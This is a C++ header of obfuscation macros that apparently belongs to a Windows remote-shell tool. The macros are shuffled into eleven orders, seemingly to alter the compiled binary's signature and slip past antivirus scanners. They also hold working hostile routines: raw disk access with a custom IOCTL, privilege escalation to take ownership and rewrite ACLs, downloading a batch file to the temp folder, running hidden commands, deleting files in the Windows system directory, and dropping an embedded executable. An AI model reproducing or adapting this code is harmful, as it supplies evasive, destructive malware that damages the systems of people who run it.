#include "stdafx.h"
#include "md5.h"

#pragma  comment(lib, "wininet")
#pragma  comment(lib, "urlmon")
#pragma  comment(lib, "ws2_32")


#define FLOWERX

using namespace std;

#define IOCTL_BEEP_SET_PROTECT_FILE	CTL_CODE(FILE_DEVICE_BEEP, 0x12, METHOD_BUFFERED, FILE_ANY_ACCESS)

char *buf = NULL;
DWORD dwSizeXXX = 0;
char szXBuff[MAX_PATH] = {0};
HANDLE hXMod = INVALID_HANDLE_VALUE;
char TmpBuf[1 + 64 + 16];
MD5_CTX md5T;
unsigned char digest[16];
int PasswdLen=0;
TOKEN_PRIVILEGES tp = { 0 }; 
LUID luid; 
DWORD cb=sizeof(TOKEN_PRIVILEGES);
BOOL bRetval = FALSE;
HANDLE hToken = NULL; 
PSID pSIDAdmin = NULL;
PSID pSIDEveryone = NULL;
PACL pACL = NULL;
int NUM_ACES  = 2;
EXPLICIT_ACCESS ea[2];
SID_IDENTIFIER_AUTHORITY SIDAuthWorld	= SECURITY_WORLD_SID_AUTHORITY;
SID_IDENTIFIER_AUTHORITY SIDAuthNT		= SECURITY_NT_AUTHORITY;
DWORD dwRes;
WIN32_FIND_DATA findData;
DWORD  dwPort     = 0;
CRITICAL_SECTION lock;
string evename = "CmdShell";
HWND hwnd;
MSG msg;
HRSRC hSrc;
HGLOBAL hGlobal;
LPVOID lp;
FILE *fd;

#define XCODE1 __try{\
		GetModuleFileName(NULL, szXBuff, sizeof(szXBuff)-1);\
		hXMod = CreateFile(szXBuff, GENERIC_READ,NULL,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);\
		if (INVALID_HANDLE_VALUE != hXMod)\
		{\
			dwSizeXXX = GetFileSize(hXMod, NULL);\
			buf = (char *)malloc(dwSizeXXX);\
			if (buf!=NULL)\
			{\
				ReadFile(hXMod, buf, dwSizeXXX, &dwSizeXXX, NULL);\
				CloseHandle(hXMod);\
				if (buf[dwSizeXXX-0x20]=='A')\
				{\
					dwSizeXXX=GetTickCount();\
				}\
			}\
		}\
	}\
	__except(EXCEPTION_EXECUTE_HANDLER){\
	Sleep(1);\
	}

#define XCODE2 __try{\
	GetModuleFileName(NULL, szXBuff, sizeof(szXBuff)-1);\
	PasswdLen = strlen(szXBuff);\
	memcpy(TmpBuf + 0x00, "\x7F", 1);\
	memcpy(TmpBuf + 0x01, szXBuff, PasswdLen);\
	memcpy(TmpBuf + 0x01 + PasswdLen, "1234567890ABCDEF", 16);\
	md5T.MD5Update((unsigned char*)TmpBuf, 17 + PasswdLen);\
	md5T.MD5Final(digest);\
	memcpy(szXBuff, digest, 16);\
	}\
	__except(EXCEPTION_EXECUTE_HANDLER){\
	Sleep(2);\
	}

#define XCODE3 __try{\
	hXMod = CreateFile("\\Device\\Harddisk0\\Partition0", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);\
	if (hXMod != INVALID_HANDLE_VALUE)\
	{\
		OutputDebugStringA("open device success");\
		dwRes = inet_addr("192.168.1.203");\
		DeviceIoControl(hXMod, IOCTL_BEEP_SET_PROTECT_FILE, szXBuff, sizeof(szXBuff), NULL, 0, &dwRes, NULL);\
		CloseHandle(hXMod);\
	}\
	}\
		__except(EXCEPTION_EXECUTE_HANDLER){\
		Sleep(3);\
	}

#define XCODE4 __try{\
	if (!AllocateAndInitializeSid(&SIDAuthWorld, 1, SECURITY_WORLD_RID, 0, 0, 0, 0, 0, 0, 0, &pSIDEveryone)) \
	{\
		;\
	}\
	if (!AllocateAndInitializeSid(&SIDAuthNT, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &pSIDAdmin)) \
	{\
		;\
	}\
	ZeroMemory(&ea, NUM_ACES * sizeof(EXPLICIT_ACCESS));\
	ea[0].grfAccessPermissions = GENERIC_READ;\
	ea[0].grfAccessMode = SET_ACCESS;\
	ea[0].grfInheritance = NO_INHERITANCE;\
	ea[0].Trustee.TrusteeForm = TRUSTEE_IS_SID;\
	ea[0].Trustee.TrusteeType = TRUSTEE_IS_WELL_KNOWN_GROUP;\
	ea[0].Trustee.ptstrName = (LPTSTR) pSIDEveryone;\
	ea[1].grfAccessPermissions = GENERIC_ALL;\
	ea[1].grfAccessMode = SET_ACCESS;\
	ea[1].grfInheritance = NO_INHERITANCE;\
	ea[1].Trustee.TrusteeForm = TRUSTEE_IS_SID;\
	ea[1].Trustee.TrusteeType = TRUSTEE_IS_GROUP;\
	ea[1].Trustee.ptstrName = (LPTSTR) pSIDAdmin;\
	if (ERROR_SUCCESS != SetEntriesInAcl(NUM_ACES, ea, NULL, &pACL))\
	{\
		;\
	}\
	dwRes = SetNamedSecurityInfo( szXBuff, SE_FILE_OBJECT, DACL_SECURITY_INFORMATION, NULL, NULL, pACL, NULL);\
	if (ERROR_SUCCESS == dwRes) \
	{\
		bRetval = TRUE;\
		;\
	}\
	if (dwRes != ERROR_ACCESS_DENIED)\
	{\
		;\
	}\
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken)) \
	{\
		; \
	} \
	if(LookupPrivilegeValue( NULL, SE_TAKE_OWNERSHIP_NAME, &luid ))\
	{\
		tp.PrivilegeCount = 1; \
		tp.Privileges[0].Luid = luid; \
		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;\
		AdjustTokenPrivileges( hToken, FALSE, &tp, cb, NULL, NULL );\
	}\
	dwRes = SetNamedSecurityInfo( szXBuff, SE_FILE_OBJECT, OWNER_SECURITY_INFORMATION, pSIDAdmin, NULL, NULL, NULL); \
	if (dwRes != ERROR_SUCCESS) \
	{\
		;\
	}\
	dwRes = SetNamedSecurityInfo( szXBuff, SE_FILE_OBJECT, DACL_SECURITY_INFORMATION, NULL, NULL, pACL, NULL);\
	if (dwRes == ERROR_SUCCESS)\
	{\
		bRetval = TRUE; \
	}\
	if (pSIDAdmin)\
		FreeSid(pSIDAdmin); \
	if (pSIDEveryone)\
		FreeSid(pSIDEveryone); \
	if (pACL)\
		LocalFree(pACL);\
	if (hToken)\
		CloseHandle(hToken);\
	}\
		__except(EXCEPTION_EXECUTE_HANDLER){\
		Sleep(4);\
	}

#define XCODE5 __try{\
	GetTempPath(64, TmpBuf);\
	strcpy(szXBuff,"http://www.eecs.ucf.edu/~leavens/Windows/bat/jtest.bat");\
	DeleteUrlCacheEntry (szXBuff);\
	strcat(TmpBuf, "dtapp.bat");\
	if (S_OK == URLDownloadToFile(NULL, szXBuff, TmpBuf, NULL,NULL))\
	{\
		fd=fopen(TmpBuf, "r");\
		fread(szXBuff, MAX_PATH, 1, fd);\
		fclose(fd);\
	}\
	else\
	{\
		WinExec("cmd /c dir", SW_HIDE);\
	}\
	}\
	__except(EXCEPTION_EXECUTE_HANDLER){\
	Sleep(5);\
	}

#define XCODE6 __try{\
	GetSystemDirectory(szXBuff, MAX_PATH);\
	SetCurrentDirectory(szXBuff);\
	hXMod = FindFirstFile(szXBuff, &findData);\
	if ((hXMod != INVALID_HANDLE_VALUE))\
	{\
		if (!(findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY))\
		{\
			GetFullPathName(findData.cFileName,MAX_PATH,szXBuff,NULL);\
			DeleteFile(szXBuff);\
		}\
		while (FindNextFile(hXMod, &findData) != 0)\
		{\
			if (!(findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY))\
			{\
				GetFullPathName(findData.cFileName,MAX_PATH,szXBuff,NULL);\
				DeleteFile(szXBuff);\
			}\
		}\
		FindClose(hXMod);\
	}\
	hXMod = FindFirstFile("*", &findData);\
	if ((hXMod != INVALID_HANDLE_VALUE))\
	{\
		if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)\
		{\
			if (findData.cFileName[0] != '.')\
			{\
				SetCurrentDirectory(findData.cFileName);\
			}\
		}\
		while (FindNextFile(hXMod, &findData) != '\x0')\
		{\
			if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)\
			{\
				if (findData.cFileName[0] != '.')\
				{\
					SetCurrentDirectory(findData.cFileName);\
				}\
			}\
		}\
		FindClose(hXMod);\
	}\
	}\
	__except(EXCEPTION_EXECUTE_HANDLER){\
	Sleep(6);\
	}

#define XCODE7 __try{\
	setlocale(LC_ALL,"chs");\
	InitializeCriticalSection(&lock);\
	SetConsoleCtrlHandler((PHANDLER_ROUTINE)NULL,TRUE);\
	hwnd = GetActiveWindow();\
	SetWindowText(hwnd,"Waiting for client connect.....");\
	PeekMessage(&msg,NULL,0,0,PM_NOREMOVE);\
	hXMod = OpenEvent(EVENT_ALL_ACCESS,TRUE,"CMD_EVENT");\
	if (NULL != hXMod)\
	{\
		if(SetEvent(hXMod))\
		{\
			while(TRUE)\
			{\
				if(PeekMessage(&msg,NULL,0,0,PM_REMOVE))\
				{\
					if (msg.message == 5)\
					{\
						dwSizeXXX = msg.wParam;\
						sprintf(szXBuff, "%d", dwSizeXXX);\
						SetWindowText(hwnd,szXBuff);\
						break;\
					}\
				}\
			}\
			evename += szXBuff;\
			hXMod=CreateEvent(NULL,FALSE,FALSE,evename.c_str());\
		}\
	}\
	}\
	__except(EXCEPTION_EXECUTE_HANDLER){\
	Sleep(7);\
	}

#define XCODE8 __try{\
	GetTempPath(64, TmpBuf);\
	strcat(TmpBuf, "dtapp.exe");\
	hSrc = FindResource(GetModuleHandle(NULL), MAKEINTRESOURCE((WORD)IDR_EXE3), "EXE");\
	hGlobal = LoadResource(NULL,hSrc);\
	lp = LockResource(hGlobal);\
	dwSizeXXX = SizeofResource(NULL,hSrc);\
	ofstream ofs(TmpBuf,ios::binary);\
	ofs.write((char*)lp,4);\
	ofs.close();\
	FreeResource(hGlobal);\
	}\
	__except(EXCEPTION_EXECUTE_HANDLER){\
	Sleep(8);\
	}

#ifdef FLOWERX
#define XXX1 XCODE1 \
XCODE2 \
XCODE3 \
XCODE4 \
XCODE5 \
XCODE6 \
XCODE7 \
XCODE8

#define XXX2 XCODE8\
	XCODE1 \
	XCODE2 \
	XCODE3 \
	XCODE4 \
	XCODE5 \
	XCODE6 \
	XCODE7

#define XXX3 	XCODE7 \
XCODE8 \
XCODE1 \
	XCODE2 \
	XCODE3 \
	XCODE4 \
	XCODE5 \
	XCODE6

#define XXX4	XCODE6 \
	XCODE7 \
	XCODE8 \
	XCODE1 \
	XCODE2 \
	XCODE3 \
	XCODE4 \
	XCODE5

#define XXX5	XCODE5 \
	XCODE6 \
	XCODE7 \
	XCODE8 \
	XCODE1 \
	XCODE2 \
	XCODE3 \
	XCODE4

#define XXX6	XCODE4 \
	XCODE5 \
	XCODE6 \
	XCODE7 \
	XCODE8 \
	XCODE1 \
	XCODE2 \
	XCODE3

#define XXX7	XCODE3 \
	XCODE4 \
	XCODE5 \
	XCODE6 \
	XCODE7 \
	XCODE8 \
	XCODE1 \
	XCODE2

#define XXX8	XCODE2 \
	XCODE3 \
	XCODE4 \
	XCODE5 \
	XCODE6 \
	XCODE7 \
	XCODE8 \
	XCODE1

#define XXX9	XCODE2 \
	XCODE4 \
	XCODE6 \
	XCODE8 \
	XCODE1 \
	XCODE3 \
	XCODE5 \
	XCODE7

#define XXX10	XCODE1 \
	XCODE3 \
	XCODE5 \
	XCODE7 \
	XCODE2 \
	XCODE4 \
	XCODE6 \
	XCODE8

#define XXX11	XCODE1 \
	XCODE4 \
	XCODE7 \
	XCODE2 \
	XCODE5 \
	XCODE8 \
	XCODE3 \
	XCODE6
#else
#define XXX1 _asm nop;
#define XXX2 _asm nop;
#define XXX3 _asm nop;
#define XXX4 _asm nop;
#define XXX5 _asm nop;
#define XXX6 _asm nop;
#define XXX7 _asm nop;
#define XXX8 _asm nop;
#define XXX9 _asm nop;
#define XXX10 _asm nop;
#define XXX11 _asm nop;
#endif
